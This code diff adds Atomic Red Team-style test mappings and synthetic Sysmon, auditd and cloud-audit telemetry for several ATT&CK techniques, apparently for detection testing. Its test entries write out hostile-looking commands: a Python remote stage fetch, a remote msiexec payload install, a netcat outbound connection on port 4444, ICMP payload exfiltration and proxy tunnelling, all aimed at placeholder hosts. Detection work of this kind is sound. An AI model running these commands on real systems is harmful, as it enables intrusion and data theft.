@@ -275,6 +275,96 @@ ATOMIC_TESTS_MAP: Dict[str, List[Dict[str, str]]] = {
             "telemetry": "Container Runtime telemetry (Image: ubuntu:latest, Privileged: true, VolumeMount: /:/host)",
         },
     ],
+    "T1033": [
+        {
+            "name": "System Owner / User Discovery via whoami",
+            "test_id": "ART T1033 #1",
+            "command": "whoami /all",
+            "telemetry": "Windows Event ID 4688 / Sysmon Event ID 1 (Image: whoami.exe, CommandLine: whoami /all)",
+        },
+        {
+            "name": "User Discovery via Native Commands on Linux",
+            "test_id": "ART T1033 #2",
+            "command": "whoami && id",
+            "telemetry": "Auditd / Sysmon Linux Event ID 1 (Image: /usr/bin/whoami, CommandLine: whoami)",
+        },
+    ],
+    "T1059.006": [
+        {
+            "name": "Python Inline Code Execution with Network Fetch",
+            "test_id": "ART T1059.006 #1",
+            "command": "python.exe -c \"import urllib.request; urllib.request.urlopen('http://example.com/stage')\"",
+            "telemetry": "Sysmon Event ID 1 (Image: python.exe, CommandLine with -c argument) / Sysmon Event ID 3 (Network connection)",
+        },
+        {
+            "name": "Python Interactive Shell or Subprocess Invocation on Linux",
+            "test_id": "ART T1059.006 #2",
+            "command": "python3 -c \"import os; os.system('whoami')\"",
+            "telemetry": "Auditd / Sysmon Linux Event ID 1 (Image: /usr/bin/python3, CommandLine with -c argument)",
+        },
+    ],
+    "T1090": [
+        {
+            "name": "Port Forwarding and Proxy via Netsh",
+            "test_id": "ART T1090 #1",
+            "command": "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.1",
+            "telemetry": "Sysmon Event ID 1 (netsh.exe with portproxy add) / Event ID 13 (Registry modification in Services\\PortProxy)",
+        },
+        {
+            "name": "SOCKS Proxy Tunneling via SSH on Linux",
+            "test_id": "ART T1090 #2",
+            "command": "ssh -N -D 1080 user@proxy.example.com",
+            "telemetry": "Auditd / Sysmon Linux Event ID 1 (Image: /usr/bin/ssh, CommandLine with -D)",
+        },
+    ],
+    "T1095": [
+        {
+            "name": "ICMP Data Exfiltration / Echo Request Tunneling on Linux",
+            "test_id": "ART T1095 #1",
+            "command": "ping -c 4 -p 616263646566 198.51.100.1",
+            "telemetry": "Auditd / Sysmon Linux Event ID 1 (Image: /bin/ping) / Network flow: ICMP payload pattern",
+        },
+        {
+            "name": "Raw Socket / Netcat Outbound Tunnel on Linux",
+            "test_id": "ART T1095 #2",
+            "command": "nc -nv 198.51.100.1 4444",
+            "telemetry": "Auditd / Sysmon Linux Event ID 1 (Image: /usr/bin/nc) / Network flow: non-standard port",
+        },
+        {
+            "name": "ICMP Echo Payload via Windows Ping",
+            "test_id": "ART T1095 #3",
+            "command": "ping.exe -n 4 -l 128 198.51.100.1",
+            "telemetry": "Sysmon Event ID 1 (Image: PING.EXE, CommandLine with -l) / Network flow: ICMP buffer size",
+        },
+    ],
+    "T1021.007": [
+        {
+            "name": "AWS Systems Manager Remote Session Start",
+            "test_id": "ART T1021.007 #1",
+            "command": "aws ssm start-session --target i-0123456789abcdef0",
+            "telemetry": "AWS CloudTrail (eventName: StartSession, eventSource: ssm.amazonaws.com) / Host agent process execution",
+        },
+        {
+            "name": "Azure Bastion Host SSH Connection",
+            "test_id": "ART T1021.007 #2",
+            "command": "az network bastion ssh --name myBastion --resource-group myRG --target-resource-id /subscriptions/sub/resourceGroups/rg/providers/Microsoft.Compute/virtualMachines/vm1",
+            "telemetry": "Azure Activity Log (Microsoft.Network/bastionHosts) / Host logon",
+        },
+    ],
+    "T1546.016": [
+        {
+            "name": "Windows Installer Quiet Package Execution via msiexec",
+            "test_id": "ART T1546.016 #1",
+            "command": "msiexec.exe /quiet /i C:\\Windows\\Temp\\malicious.msi",
+            "telemetry": "Sysmon Event ID 1 (Image: msiexec.exe, CommandLine with /quiet or /q and /i) / Event ID 11 (File creation in Temp)",
+        },
+        {
+            "name": "Windows Installer Remote Package Download and Install",
+            "test_id": "ART T1546.016 #2",
+            "command": "msiexec.exe /q /i http://example.com/payload.msi",
+            "telemetry": "Sysmon Event ID 1 (msiexec.exe) / Sysmon Event ID 3 (Network connection to external HTTP endpoint)",
+        },
+    ],
 }
 
 
@@ -848,6 +938,187 @@ def synthesize_atomic_telemetry(
                 "CommandLine": "/bin/sh -c id",
                 "ParentImage": "/usr/sbin/php-fpm",
                 "User": "www-data",
+            },
+        )
+    elif tid == "T1033":
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\whoami.exe",
+                "CommandLine": "whoami /all",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "User": "NT AUTHORITY\\SYSTEM",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/usr/bin/whoami",
+                "CommandLine": "whoami",
+                "ParentImage": "/bin/bash",
+                "User": "nobody",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/usr/bin/id",
+                "CommandLine": "id",
+                "ParentImage": "/bin/sh",
+                "User": "nobody",
+            },
+        )
+    elif tid in ("T1059.006", "T1059"):
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Python312\\python.exe",
+                "CommandLine": "python.exe -c \"import urllib.request; urllib.request.urlopen('http://example.com/stage')\"",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/usr/bin/python3",
+                "CommandLine": "python3 -c \"import os; os.system('whoami')\"",
+                "ParentImage": "/bin/bash",
+            },
+        )
+        add(
+            "network_connection",
+            {
+                "DestinationHostname": "example.com",
+                "DestinationPort": 80,
+                "Image": "python.exe",
+            },
+        )
+    elif tid in ("T1090", "T1090.001", "T1090.002", "T1090.003"):
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\netsh.exe",
+                "CommandLine": "netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.1",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "registry_set",
+            {
+                "TargetObject": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp\\0.0.0.0/8080",
+                "Details": "192.168.1.1/80",
+                "Image": "netsh.exe",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/usr/bin/ssh",
+                "CommandLine": "ssh -N -D 1080 user@proxy.example.com",
+                "ParentImage": "/bin/bash",
+            },
+        )
+        add(
+            "network_connection",
+            {
+                "DestinationHostname": "proxy.example.com",
+                "DestinationPort": 1080,
+                "Image": "ssh",
+            },
+        )
+    elif tid == "T1095":
+        add(
+            "process_creation",
+            {
+                "Image": "/bin/ping",
+                "CommandLine": "ping -c 4 -p 616263646566 198.51.100.1",
+                "ParentImage": "/bin/bash",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\PING.EXE",
+                "CommandLine": "ping.exe -n 4 -l 128 198.51.100.1",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/usr/bin/nc",
+                "CommandLine": "nc -nv 198.51.100.1 4444",
+                "ParentImage": "/bin/bash",
+            },
+        )
+        add(
+            "network_connection",
+            {
+                "DestinationIp": "198.51.100.1",
+                "DestinationPort": 4444,
+                "Protocol": "tcp",
+                "Image": "nc",
+            },
+        )
+    elif tid in ("T1021.007", "T1021"):
+        add(
+            "cloud_audit",
+            {
+                "eventSource": "ssm.amazonaws.com",
+                "eventName": "StartSession",
+                "userIdentity.type": "AssumedRole",
+                "requestParameters.target": "i-0123456789abcdef0",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/usr/bin/amazon-ssm-agent",
+                "CommandLine": "/usr/bin/ssm-session-worker",
+                "ParentImage": "/usr/bin/amazon-ssm-agent",
+                "User": "root",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Program Files\\Amazon\\SSM\\amazon-ssm-agent.exe",
+                "CommandLine": "amazon-ssm-agent.exe",
+                "ParentImage": "C:\\Windows\\System32\\services.exe",
+                "User": "NT AUTHORITY\\SYSTEM",
+            },
+        )
+    elif tid == "T1546.016":
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\msiexec.exe",
+                "CommandLine": "msiexec.exe /quiet /i C:\\Windows\\Temp\\malicious.msi",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "User": "NT AUTHORITY\\SYSTEM",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\msiexec.exe",
+                "CommandLine": "msiexec.exe /q /i http://example.com/payload.msi",
+                "ParentImage": "C:\\Windows\\explorer.exe",
+            },
+        )
+        add(
+            "file_event",
+            {
+                "TargetFilename": "C:\\Windows\\Temp\\malicious.msi",
+                "Image": "C:\\Windows\\System32\\msiexec.exe",
+            },
+        )
+        add(
+            "network_connection",
+            {
+                "DestinationHostname": "example.com",
+                "DestinationPort": 80,
+                "Image": "msiexec.exe",
             },
         )
 
